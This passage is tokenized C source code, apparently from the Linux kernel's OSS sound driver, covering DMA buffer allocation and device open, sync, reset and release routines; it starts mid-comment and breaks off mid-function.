")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "*", "Thomas", "Sailer", ":", "moved", "several", "static", "variables", "into", "struct", "audio_operations", "*", "(", "which", "is", "grossly", "misnamed", "btw", ".", ")", "because", "they", "have", "the", "same", "*", "lifetime", "as", "the", "rest", "in", "there", "and", "dynamic", "allocation", "saves", "*", "12k", "or", "so", "*", "Thomas", "Sailer", ":", "remove", "{", "in", ",", "out", "}", "_sleep_flag", ".", "It", "was", "used", "for", "the", "sleeper", "to", "*", "determine", "if", "it", "was", "woken", "up", "by", "the", "expiring", "timeout", "or", "by", "*", "an", "explicit", "wake_up", ".", "The", "return", "value", "from", "schedule_timeout", "*", "can", "be", "used", "instead", ";", "if", "0", ",", "the", "wakeup", "was", "due", "to", "the", "timeout", ".", "*", "*", "Rob", "Riggs", "Added", "persistent", "DMA", "buffers", "(", "1998", "/", "10", "/", "17", ")", "*", "/", "#", "define", "BE_CONSERVATIVE", "#", "define", "SAMPLE_ROUNDUP", "0", "#", "include", "<", "linux", "/", "mm", ".", "h", ">", "#", "include", "<", "linux", "/", "gfp", ".", "h", ">", "#", "include", "<", "linux", "/", "sched", "/", "signal", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "sleep", ".", "h", "\"", "#", "define", "DMAP_FREE_ON_CLOSE", "0", "#", "define", "DMAP_KEEP_ON_CLOSE", "1", "extern", "int", "sound_dmap_flag", ";", "static", "void", "dma_reset_output", "(", "int", "dev", ")", ";", "static", "void", "dma_reset_input", "(", "int", "dev", ")", ";", "static", "int", "local_start_dma", "(", "struct", "audio_operations", "*", "adev", ",", "unsigned", "long", "physaddr", ",", "int", "count", ",", "int", "dma_mode", ")", ";", "static", "int", "debugmem", ";", "/", "*", "switched", "off", "by", "default", "*", "/", "static", "int", "dma_buffsize", "=", "DSP_BUFFSIZE", ";", "static", "long", "dmabuf_timeout", "(", "struct", "dma_buffparms", "*", "dmap", ")", "{", "long", "tmout", ";", "tmout", "=", "(", "dmap", "-", ">", "fragment_size", "*", "HZ", ")", "/", "dmap", "-", ">", "data_rate", ";", "tmout", "+", "=", "HZ", "/", "5", ";", "/", "*", "Some", "safety", "distance", "*", "/", "if", "(", "tmout", "<", "(", "HZ", "/", "2", ")", ")", "tmout", "=", "HZ", "/", "2", ";", "if", "(", "tmout", ">", "20", "*", "HZ", ")", "tmout", "=", "20", "*", "HZ", ";", "return", "tmout", ";", "}", "static", "int", "sound_alloc_dmap", "(", "struct", "dma_buffparms", "*", "dmap", ")", "{", "char", "*", "start_addr", ",", "*", "end_addr", ";", "int", "dma_pagesize", ";", "int", "sz", ",", "size", ";", "struct", "page", "*", "page", ";", "dmap", "-", ">", "mapping_flags", "&", "=", "~", "DMA_MAP_MAPPED", ";", "if", "(", "dmap", "-", ">", "raw_buf", "!", "=", "NULL", ")", "return", "0", ";", "/", "*", "Already", "done", "*", "/", "if", "(", "dma_buffsize", "<", "4096", ")", "dma_buffsize", "=", "4096", ";", "dma_pagesize", "=", "(", "dmap", "-", ">", "dma", "<", "4", ")", "?", "(", "64", "*", "1024", ")", ":", "(", "128", "*", "1024", ")", ";", "/", "*", "*", "Now", "check", "for", "the", "Cyrix", "problem", ".", "*", "/", "if", "(", "isa_dma_bridge_buggy", "=", "=", "2", ")", "dma_pagesize", "=", "32768", ";", "dmap", "-", ">", "raw_buf", "=", "NULL", ";", "dmap", "-", ">", "buffsize", "=", "dma_buffsize", ";", "if", "(", "dmap", "-", ">", "buffsize", ">", "dma_pagesize", ")", "dmap", "-", ">", "buffsize", "=", "dma_pagesize", ";", "start_addr", "=", "NULL", ";", "/", "*", "*", "Now", "loop", "until", "we", "get", "a", "free", "buffer", ".", "Try", "to", "get", "smaller", "buffer", "if", "*", "it", "fails", ".", "Don", "'", "t", "accept", "smaller", "than", "8k", "buffer", "for", "performance", "*", "reasons", ".", "*", "/", "while", "(", "start_addr", "=", "=", "NULL", "&", "&", "dmap", "-", ">", "buffsize", ">", "PAGE_SIZE", ")", "{", "for", "(", "sz", "=", "0", ",", "size", "=", "PAGE_SIZE", ";", "size", "<", "dmap", "-", ">", "buffsize", ";", "sz", "+", "+,", "size", "<", "<=", "1", ")", ";", "dmap", "-", ">", "buffsize", "=", "PAGE_SIZE", "*", "(", "1", "<", "<", "sz", ")", ";", "start_addr", "=", "(", "char", "*", ")", "__get_free_pages", "(", "GFP_ATOMIC", "|", "GFP_DMA", "|", "__GFP_NOWARN", ",", "sz", ")", ";", "if", "(", "start_addr", "=", "=", "NULL", ")", "dmap", "-", ">", "buffsize", "/", "=", "2", ";", "}", "if", "(", "start_addr", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_WARNING", "\"", "Sound", "error", ":", "Couldn", "'", "t", "allocate", "DMA", "buffer", "\\", "n", "\"", ");", "return", "-", "ENOMEM", ";", "}", "else", "{", "/", "*", "make", "some", "checks", "*", "/", "end_addr", "=", "start_addr", "+", "dmap", "-", ">", "buffsize", "-", "1", ";", "if", "(", "debugmem", ")", "printk", "(", "KERN_DEBUG", "\"", "sound", ":", "start", "0x", "%", "lx", ",", "end", "0x", "%", "lx", "\\", "n", "\"", ",", "(", "long", ")", "start_addr", ",", "(", "long", ")", "end_addr", ")", ";", "/", "*", "now", "check", "if", "it", "fits", "into", "the", "same", "dma", "-", "pagesize", "*", "/", "if", "(", "((", "long", ")", "start_addr", "&", "~", "(", "dma_pagesize", "-", "1", ")", ")", "!", "=", "(", "(", "long", ")", "end_addr", "&", "~", "(", "dma_pagesize", "-", "1", ")", ")", "|", "|", "end_addr", ">", "=", "(", "char", "*", ")", "(", "MAX_DMA_ADDRESS", ")", ")", "{", "printk", "(", "KERN_ERR", "\"", "sound", ":", "Got", "invalid", "address", "0x", "%", "lx", "for", "%", "db", "DMA", "-", "buffer", "\\", "n", "\"", ",", "(", "long", ")", "start_addr", ",", "dmap", "-", ">", "buffsize", ")", ";", "return", "-", "EFAULT", ";", "}", "}", "dmap", "-", ">", "raw_buf", "=", "start_addr", ";", "dmap", "-", ">", "raw_buf_phys", "=", "dma_map_single", "(", "NULL", ",", "start_addr", ",", "dmap", "-", ">", "buffsize", ",", "DMA_BIDIRECTIONAL", ")", ";", "for", "(", "page", "=", "virt_to_page", "(", "start_addr", ")", ";", "page", "<", "=", "virt_to_page", "(", "end_addr", ")", ";", "page", "+", "+)", "SetPageReserved", "(", "page", ")", ";", "return", "0", ";", "}", "static", "void", "sound_free_dmap", "(", "struct", "dma_buffparms", "*", "dmap", ")", "{", "int", "sz", ",", "size", ";", "struct", "page", "*", "page", ";", "unsigned", "long", "start_addr", ",", "end_addr", ";", "if", "(", "dmap", "-", ">", "raw_buf", "=", "=", "NULL", ")", "return", ";", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "return", ";", "/", "*", "Don", "'", "t", "free", "mmapped", "buffer", ".", "Will", "use", "it", "next", "time", "*", "/", "for", "(", "sz", "=", "0", ",", "size", "=", "PAGE_SIZE", ";", "size", "<", "dmap", "-", ">", "buffsize", ";", "sz", "+", "+,", "size", "<", "<=", "1", ")", ";", "start_addr", "=", "(", "unsigned", "long", ")", "dmap", "-", ">", "raw_buf", ";", "end_addr", "=", "start_addr", "+", "dmap", "-", ">", "buffsize", ";", "for", "(", "page", "=", "virt_to_page", "(", "start_addr", ")", ";", "page", "<", "=", "virt_to_page", "(", "end_addr", ")", ";", "page", "+", "+)", "ClearPageReserved", "(", "page", ")", ";", "dma_unmap_single", "(", "NULL", ",", "dmap", "-", ">", "raw_buf_phys", ",", "dmap", "-", ">", "buffsize", ",", "DMA_BIDIRECTIONAL", ")", ";", "free_pages", "(", "(", "unsigned", "long", ")", "dmap", "-", ">", "raw_buf", ",", "sz", ")", ";", "dmap", "-", ">", "raw_buf", "=", "NULL", ";", "}", "/", "*", "Intel", "version", "!", "!!", "!!", "!!", "!!", "*", "/", "static", "int", "sound_start_dma", "(", "struct", "dma_buffparms", "*", "dmap", ",", "unsigned", "long", "physaddr", ",", "int", "count", ",", "int", "dma_mode", ")", "{", "unsigned", "long", "flags", ";", "int", "chan", "=", "dmap", "-", ">", "dma", ";", "/", "*", "printk", "(", "\"", "Start", "DMA", "%", "d", "%", "d", ",", "%", "d", "\\", "n", "\"", ",", "chan", ",", "(", "int", ")", "(", "physaddr", "-", "dmap", "-", ">", "raw_buf_phys", ")", ",", "count", ")", ";", "*", "/", "flags", "=", "claim_dma_lock", "(", ");", "disable_dma", "(", "chan", ")", ";", "clear_dma_ff", "(", "chan", ")", ";", "set_dma_mode", "(", "chan", ",", "dma_mode", ")", ";", "set_dma_addr", "(", "chan", ",", "physaddr", ")", ";", "set_dma_count", "(", "chan", ",", "count", ")", ";", "enable_dma", "(", "chan", ")", ";", "release_dma_lock", "(", "flags", ")", ";", "return", "0", ";", "}", "static", "void", "dma_init_buffers", "(", "struct", "dma_buffparms", "*", "dmap", ")", "{", "dmap", "-", ">", "qlen", "=", "dmap", "-", ">", "qhead", "=", "dmap", "-", ">", "qtail", "=", "dmap", "-", ">", "user_counter", "=", "0", ";", "dmap", "-", ">", "byte_counter", "=", "0", ";", "dmap", "-", ">", "max_byte_counter", "=", "8000", "*", "60", "*", "60", ";", "dmap", "-", ">", "bytes_in_use", "=", "dmap", "-", ">", "buffsize", ";", "dmap", "-", ">", "dma_mode", "=", "DMODE_NONE", ";", "dmap", "-", ">", "mapping_flags", "=", "0", ";", "dmap", "-", ">", "neutral_byte", "=", "0x80", ";", "dmap", "-", ">", "data_rate", "=", "8000", ";", "dmap", "-", ">", "cfrag", "=", "-", "1", ";", "dmap", "-", ">", "closing", "=", "0", ";", "dmap", "-", ">", "nbufs", "=", "1", ";", "dmap", "-", ">", "flags", "=", "DMA_BUSY", ";", "/", "*", "Other", "flags", "off", "*", "/", "}", "static", "int", "open_dmap", "(", "struct", "audio_operations", "*", "adev", ",", "int", "mode", ",", "struct", "dma_buffparms", "*", "dmap", ")", "{", "int", "err", ";", "if", "(", "dmap", "-", ">", "flags", "&", "DMA_BUSY", ")", "return", "-", "EBUSY", ";", "if", "(", "(", "err", "=", "sound_alloc_dmap", "(", "dmap", ")", ")", "<", "0", ")", "return", "err", ";", "if", "(", "dmap", "-", ">", "raw_buf", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_WARNING", "\"", "Sound", ":", "DMA", "buffers", "not", "available", "\\", "n", "\"", ");", "return", "-", "ENOSPC", ";", "/", "*", "Memory", "allocation", "failed", "during", "boot", "*", "/", "}", "if", "(", "dmap", "-", ">", "dma", ">", "=", "0", "&", "&", "sound_open_dma", "(", "dmap", "-", ">", "dma", ",", "adev", "-", ">", "name", ")", ")", "{", "printk", "(", "KERN_WARNING", "\"", "Unable", "to", "grab", "(", "2", ")", "DMA", "%", "d", "for", "the", "audio", "driver", "\\", "n", "\"", ",", "dmap", "-", ">", "dma", ")", ";", "return", "-", "EBUSY", ";", "}", "dma_init_buffers", "(", "dmap", ")", ";", "spin_lock_init", "(", "&", "dmap", "-", ">", "lock", ")", ";", "dmap", "-", ">", "open_mode", "=", "mode", ";", "dmap", "-", ">", "subdivision", "=", "dmap", "-", ">", "underrun_count", "=", "0", ";", "dmap", "-", ">", "fragment_size", "=", "0", ";", "dmap", "-", ">", "max_fragments", "=", "65536", ";", "/", "*", "Just", "a", "large", "value", "*", "/", "dmap", "-", ">", "byte_counter", "=", "0", ";", "dmap", "-", ">", "max_byte_counter", "=", "8000", "*", "60", "*", "60", ";", "dmap", "-", ">", "applic_profile", "=", "APF_NORMAL", ";", "dmap", "-", ">", "needs_reorg", "=", "1", ";", "dmap", "-", ">", "audio_callback", "=", "NULL", ";", "dmap", "-", ">", "callback_parm", "=", "0", ";", "return", "0", ";", "}", "static", "void", "close_dmap", "(", "struct", "audio_operations", "*", "adev", ",", "struct", "dma_buffparms", "*", "dmap", ")", "{", "unsigned", "long", "flags", ";", "if", "(", "dmap", "-", ">", "dma", ">", "=", "0", ")", "{", "sound_close_dma", "(", "dmap", "-", ">", "dma", ")", ";", "flags", "=", "claim_dma_lock", "(", ");", "disable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "release_dma_lock", "(", "flags", ")", ";", "}", "if", "(", "dmap", "-", ">", "flags", "&", "DMA_BUSY", ")", "dmap", "-", ">", "dma_mode", "=", "DMODE_NONE", ";", "dmap", "-", ">", "flags", "&", "=", "~", "DMA_BUSY", ";", "if", "(", "sound_dmap_flag", "=", "=", "DMAP_FREE_ON_CLOSE", ")", "sound_free_dmap", "(", "dmap", ")", ";", "}", "static", "unsigned", "int", "default_set_bits", "(", "int", "dev", ",", "unsigned", "int", "bits", ")", "{", "mm_segment_t", "fs", "=", "get_fs", "(", ");", "set_fs", "(", "get_ds", "(", "))", ";", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "ioctl", "(", "dev", ",", "SNDCTL_DSP_SETFMT", ",", "(", "void", "__user", "*", ")&", "bits", ")", ";", "set_fs", "(", "fs", ")", ";", "return", "bits", ";", "}", "static", "int", "default_set_speed", "(", "int", "dev", ",", "int", "speed", ")", "{", "mm_segment_t", "fs", "=", "get_fs", "(", ");", "set_fs", "(", "get_ds", "(", "))", ";", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "ioctl", "(", "dev", ",", "SNDCTL_DSP_SPEED", ",", "(", "void", "__user", "*", ")&", "speed", ")", ";", "set_fs", "(", "fs", ")", ";", "return", "speed", ";", "}", "static", "short", "default_set_channels", "(", "int", "dev", ",", "short", "channels", ")", "{", "int", "c", "=", "channels", ";", "mm_segment_t", "fs", "=", "get_fs", "(", ");", "set_fs", "(", "get_ds", "(", "))", ";", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "ioctl", "(", "dev", ",", "SNDCTL_DSP_CHANNELS", ",", "(", "void", "__user", "*", ")&", "c", ")", ";", "set_fs", "(", "fs", ")", ";", "return", "c", ";", "}", "static", "void", "check_driver", "(", "struct", "audio_driver", "*", "d", ")", "{", "if", "(", "d", "-", ">", "set_speed", "=", "=", "NULL", ")", "d", "-", ">", "set_speed", "=", "default_set_speed", ";", "if", "(", "d", "-", ">", "set_bits", "=", "=", "NULL", ")", "d", "-", ">", "set_bits", "=", "default_set_bits", ";", "if", "(", "d", "-", ">", "set_channels", "=", "=", "NULL", ")", "d", "-", ">", "set_channels", "=", "default_set_channels", ";", "}", "int", "DMAbuf_open", "(", "int", "dev", ",", "int", "mode", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "int", "retval", ";", "struct", "dma_buffparms", "*", "dmap_in", "=", "NULL", ";", "struct", "dma_buffparms", "*", "dmap_out", "=", "NULL", ";", "if", "(", "!", "adev", ")", "return", "-", "ENXIO", ";", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", ")", "adev", "-", ">", "dmap_in", "=", "adev", "-", ">", "dmap_out", ";", "check_driver", "(", "adev", "-", ">", "d", ")", ";", "if", "(", "(", "retval", "=", "adev", "-", ">", "d", "-", ">", "open", "(", "dev", ",", "mode", ")", ")", "<", "0", ")", "return", "retval", ";", "dmap_out", "=", "adev", "-", ">", "dmap_out", ";", "dmap_in", "=", "adev", "-", ">", "dmap_in", ";", "if", "(", "dmap_in", "=", "=", "dmap_out", ")", "adev", "-", ">", "flags", "&", "=", "~", "DMA_DUPLEX", ";", "if", "(", "mode", "&", "OPEN_WRITE", ")", "{", "if", "(", "(", "retval", "=", "open_dmap", "(", "adev", ",", "mode", ",", "dmap_out", ")", ")", "<", "0", ")", "{", "adev", "-", ">", "d", "-", ">", "close", "(", "dev", ")", ";", "return", "retval", ";", "}", "}", "adev", "-", ">", "enable_bits", "=", "mode", ";", "if", "(", "mode", "=", "=", "OPEN_READ", "|", "|", "(", "mode", "!", "=", "OPEN_WRITE", "&", "&", "(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", "))", "{", "if", "(", "(", "retval", "=", "open_dmap", "(", "adev", ",", "mode", ",", "dmap_in", ")", ")", "<", "0", ")", "{", "adev", "-", ">", "d", "-", ">", "close", "(", "dev", ")", ";", "if", "(", "mode", "&", "OPEN_WRITE", ")", "close_dmap", "(", "adev", ",", "dmap_out", ")", ";", "return", "retval", ";", "}", "}", "adev", "-", ">", "open_mode", "=", "mode", ";", "adev", "-", ">", "go", "=", "1", ";", "adev", "-", ">", "d", "-", ">", "set_bits", "(", "dev", ",", "8", ")", ";", "adev", "-", ">", "d", "-", ">", "set_channels", "(", "dev", ",", "1", ")", ";", "adev", "-", ">", "d", "-", ">", "set_speed", "(", "dev", ",", "DSP_DEFAULT_SPEED", ")", ";", "if", "(", "adev", "-", ">", "dmap_out", "-", ">", "dma_mode", "=", "=", "DMODE_OUTPUT", ")", "memset", "(", "adev", "-", ">", "dmap_out", "-", ">", "raw_buf", ",", "adev", "-", ">", "dmap_out", "-", ">", "neutral_byte", ",", "adev", "-", ">", "dmap_out", "-", ">", "bytes_in_use", ")", ";", "return", "0", ";", "}", "/", "*", "MUST", "not", "hold", "the", "spinlock", "*", "/", "void", "DMAbuf_reset", "(", "int", "dev", ")", "{", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", "dma_reset_output", "(", "dev", ")", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", "dma_reset_input", "(", "dev", ")", ";", "}", "static", "void", "dma_reset_output", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "long", "flags", ",", "f", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_STARTED", ")", ")", "/", "*", "DMA", "is", "not", "active", "*", "/", "return", ";", "/", "*", "*", "First", "wait", "until", "the", "current", "fragment", "has", "been", "played", "completely", "*", "/", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "adev", "-", ">", "dmap_out", "-", ">", "flags", "|", "=", "DMA_SYNCING", ";", "adev", "-", ">", "dmap_out", "-", ">", "underrun_count", "=", "0", ";", "if", "(", "!", "signal_pending", "(", "current", ")", "&", "&", "adev", "-", ">", "dmap_out", "-", ">", "qlen", "&", "&", "adev", "-", ">", "dmap_out", "-", ">", "underrun_count", "=", "=", "0", ")", "{", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "oss_broken_sleep_on", "(", "&", "adev", "-", ">", "out_sleeper", ",", "dmabuf_timeout", "(", "dmap", ")", ");", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "adev", "-", ">", "dmap_out", "-", ">", "flags", "&", "=", "~", "(", "DMA_SYNCING", "|", "DMA_ACTIVE", ")", ";", "/", "*", "*", "Finally", "shut", "the", "device", "off", "*", "/", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", "|", "|", "!", "adev", "-", ">", "d", "-", ">", "halt_output", ")", "adev", "-", ">", "d", "-", ">", "halt_io", "(", "dev", ")", ";", "else", "adev", "-", ">", "d", "-", ">", "halt_output", "(", "dev", ")", ";", "adev", "-", ">", "dmap_out", "-", ">", "flags", "&", "=", "~", "DMA_STARTED", ";", "f", "=", "claim_dma_lock", "(", ");", "clear_dma_ff", "(", "dmap", "-", ">", "dma", ")", ";", "disable_dma", "(", "dmap", "-", ">", "dma", ")", ";", "release_dma_lock", "(", "f", ")", ";", "dmap", "-", ">", "byte_counter", "=", "0", ";", "reorganize_buffers", "(", "dev", ",", "adev", "-", ">", "dmap_out", ",", "0", ")", ";", "dmap", "-", ">", "qlen", "=", "dmap", "-", ">", "qhead", "=", "dmap", "-", ">", "qtail", "=", "dmap", "-", ">", "user_counter", "=", "0", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "static", "void", "dma_reset_input", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "long", "flags", ";", "struct", "dma_buffparms", "*", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "!(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", "|", "|", "!", "adev", "-", ">", "d", "-", ">", "halt_input", ")", "adev", "-", ">", "d", "-", ">", "halt_io", "(", "dev", ")", ";", "else", "adev", "-", ">", "d", "-", ">", "halt_input", "(", "dev", ")", ";", "adev", "-", ">", "dmap_in", "-", ">", "flags", "&", "=", "~", "DMA_STARTED", ";", "dmap", "-", ">", "qlen", "=", "dmap", "-", ">", "qhead", "=", "dmap", "-", ">", "qtail", "=", "dmap", "-", ">", "user_counter", "=", "0", ";", "dmap", "-", ">", "byte_counter", "=", "0", ";", "reorganize_buffers", "(", "dev", ",", "adev", "-", ">", "dmap_in", ",", "1", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "/", "*", "MUST", "be", "called", "with", "holding", "the", "dmap", "-", ">", "lock", "*", "/", "void", "DMAbuf_launch_output", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "if", "(", "!(", "(", "adev", "-", ">", "enable_bits", "*", "adev", "-", ">", "go", ")", "&", "PCM_ENABLE_OUTPUT", ")", ")", "return", ";", "/", "*", "Don", "'", "t", "start", "DMA", "yet", "*", "/", "dmap", "-", ">", "dma_mode", "=", "DMODE_OUTPUT", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_ACTIVE", ")", "|", "|", "!", "(", "adev", "-", ">", "flags", "&", "DMA_AUTOMODE", ")", "|", "|", "(", "dmap", "-", ">", "flags", "&", "DMA_NODMA", ")", ")", "{", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_STARTED", ")", ")", "{", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "0", ")", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "prepare_for_output", "(", "dev", ",", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "nbufs", ")", ")", "return", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_NODMA", ")", ")", "local_start_dma", "(", "adev", ",", "dmap", "-", ">", "raw_buf_phys", ",", "dmap", "-", ">", "bytes_in_use", ",", "DMA_MODE_WRITE", ")", ";", "dmap", "-", ">", "flags", "|", "=", "DMA_STARTED", ";", "}", "if", "(", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "=", "=", "0", ")", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", "=", "dmap", "-", ">", "fragment_size", ";", "dmap", "-", ">", "dma_mode", "=", "DMODE_OUTPUT", ";", "adev", "-", ">", "d", "-", ">", "output_block", "(", "dev", ",", "dmap", "-", ">", "raw_buf_phys", "+", "dmap", "-", ">", "qhead", "*", "dmap", "-", ">", "fragment_size", ",", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", ",", "1", ")", ";", "if", "(", "adev", "-", ">", "d", "-", ">", "trigger", ")", "adev", "-", ">", "d", "-", ">", "trigger", "(", "dev", ",", "adev", "-", ">", "enable_bits", "*", "adev", "-", ">", "go", ")", ";", "}", "dmap", "-", ">", "flags", "|", "=", "DMA_ACTIVE", ";", "}", "int", "DMAbuf_sync", "(", "int", "dev", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "long", "flags", ";", "int", "n", "=", "0", ";", "struct", "dma_buffparms", "*", "dmap", ";", "if", "(", "!", "adev", "-", ">", "go", "&", "&", "!", "(", "adev", "-", ">", "enable_bits", "&", "PCM_ENABLE_OUTPUT", ")", ")", "return", "0", ";", "if", "(", "adev", "-", ">", "dmap_out", "-", ">", "dma_mode", "=", "=", "DMODE_OUTPUT", ")", "{", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "dmap", "-", ">", "qlen", ">", "0", "&", "&", "!", "(", "dmap", "-", ">", "flags", "&", "DMA_ACTIVE", ")", ")", "DMAbuf_launch_output", "(", "dev", ",", "dmap", ")", ";", "adev", "-", ">", "dmap_out", "-", ">", "flags", "|", "=", "DMA_SYNCING", ";", "adev", "-", ">", "dmap_out", "-", ">", "underrun_count", "=", "0", ";", "while", "(", "!", "signal_pending", "(", "current", ")", "&", "&", "n", "+", "+", "<", "adev", "-", ">", "dmap_out", "-", ">", "nbufs", "&", "&", "adev", "-", ">", "dmap_out", "-", ">", "qlen", "&", "&", "adev", "-", ">", "dmap_out", "-", ">", "underrun_count", "=", "=", "0", ")", "{", "long", "t", "=", "dmabuf_timeout", "(", "dmap", ")", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "FIXME", ":", "not", "safe", "may", "miss", "events", "*", "/", "t", "=", "oss_broken_sleep_on", "(", "&", "adev", "-", ">", "out_sleeper", ",", "t", ")", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "!", "t", ")", "{", "adev", "-", ">", "dmap_out", "-", ">", "flags", "&", "=", "~", "DMA_SYNCING", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "adev", "-", ">", "dmap_out", "-", ">", "qlen", ";", "}", "}", "adev", "-", ">", "dmap_out", "-", ">", "flags", "&", "=", "~", "(", "DMA_SYNCING", "|", "DMA_ACTIVE", ")", ";", "/", "*", "*", "Some", "devices", "such", "as", "GUS", "have", "huge", "amount", "of", "on", "board", "RAM", "for", "the", "*", "audio", "data", ".", "We", "have", "to", "wait", "until", "the", "device", "has", "finished", "playing", ".", "*", "/", "/", "*", "still", "holding", "the", "lock", "*", "/", "if", "(", "adev", "-", ">", "d", "-", ">", "local_qlen", ")", "{", "/", "*", "Device", "has", "hidden", "buffers", "*", "/", "while", "(", "!", "signal_pending", "(", "current", ")", "&", "&", "adev", "-", ">", "d", "-", ">", "local_qlen", "(", "dev", ")", "){", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "oss_broken_sleep_on", "(", "&", "adev", "-", ">", "out_sleeper", ",", "dmabuf_timeout", "(", "dmap", ")", ");", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "}", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "}", "adev", "-", ">", "dmap_out", "-", ">", "dma_mode", "=", "DMODE_NONE", ";", "return", "adev", "-", ">", "dmap_out", "-", ">", "qlen", ";", "}", "int", "DMAbuf_release", "(", "int", "dev", ",", "int", "mode", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "struct", "dma_buffparms", "*", "dmap", ";", "unsigned", "long", "flags", ";", "dmap", "=", "adev", "-", ">", "dmap_out", ";", "if", "(", "adev", "-", ">", "open_mode", "&", "OPEN_WRITE", ")", "adev", "-", ">", "dmap_out", "-", ">", "closing", "=", "1", ";", "if", "(", "adev", "-", ">", "open_mode", "&", "OPEN_READ", ")", "{", "adev", "-", ">", "dmap_in", "-", ">", "closing", "=", "1", ";", "dmap", "=", "adev", "-", ">", "dmap_in", ";", "}", "if", "(", "adev", "-", ">", "open_mode", "&", "OPEN_WRITE", ")", "if", "(", "!(", "adev", "-", ">", "dmap_out", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", ")", "if", "(", "!", "signal_pending", "(", "current", ")", "&", "&", "(", "adev", "-", ">", "dmap_out", "-", ">", "dma_mode", "=", "=", "DMODE_OUTPUT", ")", ")", "DMAbuf_sync", "(", "dev", ")", ";", "if", "(", "adev", "-", ">", "dmap_out", "-", ">", "dma_mode", "=", "=", "DMODE_OUTPUT", ")", "memset", "(", "adev", "-", ">", "dmap_out", "-", ">", "raw_buf", ",", "adev", "-", ">", "dmap_out", "-", ">", "neutral_byte", ",", "adev", "-", ">", "dmap_out", "-", ">", "bytes_in_use", ")", ";", "DMAbuf_reset", "(", "dev", ")", ";", "spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "adev", "-", ">", "d", "-", ">", "close", "(", "dev", ")", ";", "if", "(", "adev", "-", ">", "open_mode", "&", "OPEN_WRITE", ")", "close_dmap", "(", "adev", ",", "adev", "-", ">", "dmap_out", ")", ";", "if", "(", "adev", "-", ">", "open_mode", "=", "=", "OPEN_READ", "|", "|", "(", "adev", "-", ">", "open_mode", "!", "=", "OPEN_WRITE", "&", "&", "(", "adev", "-", ">", "flags", "&", "DMA_DUPLEX", ")", "))", "close_dmap", "(", "adev", ",", "adev", "-", ">", "dmap_in", ")", ";", "adev", "-", ">", "open_mode", "=", "0", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "return", "0", ";", "}", "/", "*", "called", "with", "dmap", "-", ">", "lock", "dold", "*", "/", "int", "DMAbuf_activate_recording", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ")", "{", "struct", "audio_operations", "*", "adev", "=", "audio_devs", "[", "dev", "]", ";", "int", "err", ";", "if", "(", "!(", "adev", "-", ">", "open_mode", "&", "OPEN_READ", ")", ")", "return", "0", 